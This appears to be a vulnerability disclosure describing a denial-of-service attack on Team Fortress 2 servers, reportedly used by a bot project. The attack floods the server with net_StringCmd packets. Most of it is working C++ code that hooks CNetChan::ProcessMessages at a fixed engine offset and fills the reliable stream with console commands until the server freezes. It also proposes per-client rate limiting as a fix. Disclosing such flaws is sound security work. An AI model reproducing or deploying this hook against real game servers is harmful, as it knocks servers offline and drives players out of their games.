# Creating lags using the net_StringCmd packet

Hi. With the help of a huge number of net_StringCmd packets, the client is able to "freeze" the server, creating lags. Currently it is used in the LagBot project - a private project based on the CatBot project, which for now have filled the game servers of the game Team Fortress 2 "Casual" mode. It is enough to continuously send thousands of these packets per unit of time, so that the server began to experience lags, or "shutdown" effect. This is caused by the fact that the server tries to find the necessary command in the lists of console variables and commands, which requires CPU time. The only solution that I see is to limit the processing of net_StringCmd packets per second from client.

I managed to implement this exploit by intercepting the ProcessMessages method of the CNetChan class, inserting into it an own handler that generates net_StringCmd packets.

```cpp
bool __fastcall hkCNetChan_ProcessMessages(CNetChan *pThis, int, bf_read *pBuf)
{
	//
	// Get original address of CNetChan::ProcessMessages method.
	//

	static auto pfnCNetChan_ProcessMessages = TProcessMessages(Engine[0x1B5A40]);

	if (g_bExecuteHeh)
	{
		//
		// Simple way to send as much as possible
		// amount of net_StringCmd packet.
		//

		pThis->SetCompressionMode(true);
		pThis->SetMaxBufferSize(true, NET_MAX_PAYLOAD);

		auto pNetBuf = &pThis->m_StreamReliable;
		
		//
		// Fill to the limit the reliable stream.
		//

		while (pNetBuf->GetNumBitsWritten() + 15 < pNetBuf->GetNumBitsLeft())
		{
			pNetBuf->WriteHeader(net_StringCmd);

			//
			// You can choose any console command,
			// 'menuselect' is for example.
			//

			pNetBuf->WriteString("menuselect 1 1");
		}
	}

	//
	// Call original method.
	//

	return pfnCNetChan_ProcessMessages(pThis, pBuf);
}
```

## Impact

As described above - the attacker is able to "freeze" the server, completely stopping the game process and forcing current players to leave the server.